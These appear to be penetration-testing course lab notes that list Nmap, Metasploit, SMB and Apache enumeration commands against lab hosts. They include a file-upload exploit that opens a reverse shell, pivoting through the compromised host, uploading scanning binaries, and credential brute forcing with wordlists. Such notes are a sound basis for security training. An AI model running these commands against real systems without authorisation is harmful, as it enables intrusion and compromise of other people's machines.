# Assessment Methodologies: Enumeration

## Nmap Scripting Engine (NSE)

### **Windows Recon: Nmap Host Discovery**

```bash
ping -c 5 demo.ine.local
nmap demo.ine.local
nmap -Pn demo.ine.local
nmap -Pn -p 443 demo.ine.local
nmap -Pn -sV -p 80 demo.ine.local
```

### **Importing Nmap Scan Results Into MSF**

```bash
ping -c 4 demo.ine.local
nmap -sV -Pn -oX myscan.xml demo.ine.local
service postgresql start
msfconsole
db_status
db_import myscan.xml
hosts
services
```

### T1046 : Network Service Scanning

```bash
ping -c 4 demo1.ine.local
nmap demo1.ine.local
curl demo1.ine.local
msfconsole
use exploit/unix/webapp/xoda_file_upload
set RHOSTS demo1.ine.local
set TARGETURI /
set LHOST 192.63.4.2
exploit
shell
ip addr
run autoroute -s 192.180.108.2
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.180.108.3
set verbose false
set ports 1-1000
exploit
ls -al /root/static-binaries/nmap
file /root/static-binaries/nmap
CTRL+z
#!/bin/bash
for port in {1..1000}; do
 timeout 1 bash -c "echo >/dev/tcp/$1/$port" 2>/dev/null && echo "port $port is open"
done
fg
sessions -i 1
upload /root/static-binaries/nmap /tmp/nmap
upload /root/bash-port-scanner.sh /tmp/bash-port-scanner.sh
shell
cd /tmp/
chmod +x ./nmap ./bash-port-scanner.sh
./bash-port-scanner.sh 192.180.108.3
./nmap -p- 192.180.108.3
```

### Service Enumeration

```bash
ping -c 4 demo.ine.local
msfconsole
use auxiliary/scanner/ftp/ftp_version
set RHOSTS demo.ine.local
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
run
use auxiliary/scanner/ftp/anonymous
set RHOSTS demo.ine.local
run
```

### **Samba Recon: Basics**

```
nmap -sU --top-ports 25 demo.ine.local
nmap -sV -p 445 demo.ine.local
nmap --script smb-os-discovery.nse -p 445 demo.ine.local
msfconsole -q
use auxiliary/scanner/smb/smb_version
set RHOSTS demo.ine.local
exploit
nmap --script smb-os-discovery.nse -p 445 demo.ine.local
nmblookup -A demo.ine.local
smbclient -L demo.ine.local -N
rpcclient -U "" -N demo.ine.local
```

### **Apache Enumeration**

```bash
ping -c 5 victim-1
msfconsole -q
use auxiliary/scanner/http/http_version
set RHOSTS victim-1
run
use auxiliary/scanner/http/robots_txt
set RHOSTS victim-1
run
use auxiliary/scanner/http/http_header
set RHOSTS victim-1
run
use auxiliary/scanner/http/http_header
set RHOSTS victim-1
set TARGETURI /secure
run
use auxiliary/scanner/http/brute_dirs
set RHOSTS victim-1
run
use auxiliary/scanner/http/dir_scanner
set RHOSTS victim-1
set DICTIONARY /usr/share/metasploit-framework/data/wordlists/directory.txt
run
use auxiliary/scanner/http/dir_listing
set RHOSTS victim-1
set PATH /data
run
use auxiliary/scanner/http/files_dir
set RHOSTS victim-1
set VERBOSE false
run
use auxiliary/scanner/http/http_put
set RHOSTS victim-1
set PATH /data
set FILENAME test.txt
set FILEDATA "Welcome To AttackDefense"
run
wget http://victim-1:80/data/test.txt 
cat test.txt
use auxiliary/scanner/http/http_put
set RHOSTS victim-1
set PATH /data
set FILENAME test.txt
set ACTION DELETE
run
wget http://victim-1:80/data/test.txt 
use auxiliary/scanner/http/http_login
set RHOSTS victim-1
set AUTH_URI /secure/
set VERBOSE false
run
use auxiliary/scanner/http/apache_userdir_enum
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set RHOSTS victim-1
set VERBOSE false
run
```
